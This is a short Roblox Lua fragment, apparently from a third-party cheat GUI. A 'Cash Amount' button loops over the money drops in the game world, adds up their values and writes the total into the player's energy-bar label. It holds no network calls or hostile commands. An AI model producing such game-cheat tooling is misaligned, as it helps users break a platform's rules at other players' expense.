CashAmount.Text = "Cash Amount"
CashAmount.TextColor3 = Color3.fromRGB(255, 255, 255)
CashAmount.TextSize = 13.000
CashAmount.MouseButton1Down:connect(function()
local player = game.Players.LocalPlayer
local character = player.Character
local money = 0
local formatNumber = (function (n)
    n = tostring(n)
    return n:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end)
    
    local function SetCash()
        money = 0
        for i,v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
            if v.Name == 'MoneyDrop' then
                local string = v.BillboardGui.TextLabel.Text
                local filtered = string.gsub(string, "[^%w ]", "")
                local cash = tonumber(filtered)
                money = money + cash
            end
        end
        game:GetService("Players"):FindFirstChild(game.Players.LocalPlayer.Name).PlayerGui.MainScreenGui.Bar.Energy.TextLabel.Text = formatNumber(money)
    end
while wait()do 
    SetCash()

end

end)

